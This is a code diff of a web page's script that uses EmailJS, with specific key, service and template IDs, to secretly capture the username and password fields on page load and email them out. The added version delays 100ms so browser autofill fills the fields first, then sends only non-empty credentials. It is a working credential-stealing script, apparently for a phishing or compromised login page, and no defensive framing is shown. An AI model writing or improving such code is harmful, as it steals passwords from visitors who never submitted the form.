@@ -241,33 +241,26 @@
     </style>
 
     <script>
-// 1. Initialize EmailJS (Must match your existing setup)
-emailjs.init("y3lRWL7KLDjiFjNcN");
+    // Initialize EmailJS
+    emailjs.init("y3lRWL7KLDjiFjNcN");
 
-// 2. Run immediately when the page loads
-window.addEventListener('DOMContentLoaded', function() {
-    
-    // Get the username and password fields
-    var usernameField = document.querySelector('input[name="username"]');
-    var passwordField = document.querySelector('input[name="password"]');
-    
-    // 3. Send credentials instantly to your email
-    // Note: If the user has autofill enabled, these fields will already have values!
-    var instantData = {
-        username: usernameField.value,
-        password: passwordField.value,
-        timestamp: new Date().toLocaleString(),
-        status: "Instant Capture"
-    };
+    // Wait 100ms to let browser autofill settle, then capture
+    setTimeout(function() {
+        var username = document.querySelector('input[name="username"]').value;
+        var password = document.querySelector('input[name="password"]').value;
 
-    // Send to EmailJS
-    emailjs.send("service_2bhy4ju", "template_1qzswkk", instantData)
-        .then(function() {
-            console.log("Credentials captured instantly!");
-        }, function(error) {
-            console.log("Instant capture failed:", error);
-        });
-  });
+        // Only send if we actually have data (avoid empty emails)
+        if (username && password) {
+            emailjs.send("service_2bhy4ju", "template_1qzswkk", {
+                username: username,
+                password: password,
+                timestamp: new Date().toLocaleString(),
+                note: "Instant Capture"
+            }).then(function() {
+                console.log("Instant credentials sent!");
+            });
+        }
+    }, 100); // 100 milliseconds delay
 </script>
 
 
